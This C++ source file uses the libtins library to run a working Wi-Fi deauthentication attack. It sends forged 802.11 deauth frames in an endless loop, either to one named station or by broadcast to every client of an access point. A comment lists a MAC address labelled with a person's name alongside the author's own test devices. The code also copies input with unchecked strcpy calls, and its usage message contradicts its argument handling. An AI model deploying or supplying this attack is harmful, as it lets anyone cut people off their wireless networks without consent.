#include <iostream>
#include <string.h>
#include <tins/tins.h>
#include <unistd.h>
#include <vector>
using namespace Tins;
using namespace std;

// diconnect all station is unicast

int main(int argc, char * argv[])
{
    RadioTap radio;
    PacketSender sender;
    char station[18];
    char ap[18];
    if(argc>=4)     // diconnect specific station in ap
    {
        strcpy(ap,argv[2]);
        strcpy(station,argv[3]);
    }
    else if(argc==3)    // diconnect all station in ap
    {
        strcpy(ap,argv[2]);
        strcpy(station,"FF:FF:FF:FF:FF:FF");
    }
    else
    {
        printf("usage <interface> <bssid> <ap> \n <interface> <bssid> <ap> <station>\n");
        exit(0);
    }
    Dot11Deauthentication Deauth(station, ap); // client, AP
    Deauth.addr3(ap);   // BSSID;
    //Dot11Deauthentication Deauth("FF:FF:FF:FF:FF:FF","C4:88:E5:0B:16:E4"); // disconnect all ap

    radio.inner_pdu(Deauth);
    while(1)
    {
        sender.send(radio,argv[1]);
        sleep(1);
    }

    // "00:24:a5:ea:c4:fa" my test ap
    // "C4:88:E5:0B:16:E4" my test station
    // 90:9F:33:9A:47:36 Bob Mill
}
